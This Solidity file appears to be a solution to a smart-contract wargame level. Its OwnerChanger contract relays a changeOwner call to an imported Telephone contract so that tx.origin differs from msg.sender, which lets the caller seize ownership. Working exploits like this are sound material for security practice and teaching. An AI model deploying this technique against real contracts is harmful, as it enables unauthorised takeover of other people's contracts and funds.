// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./telephone.sol";

contract OwnerChanger {
  Telephone public telephoneContract;

  constructor(Telephone telephoneAddy) {
    telephoneContract = Telephone(telephoneAddy);
  }

  function changeOwner(address _owner) public {
    telephoneContract.changeOwner(_owner);
  }
}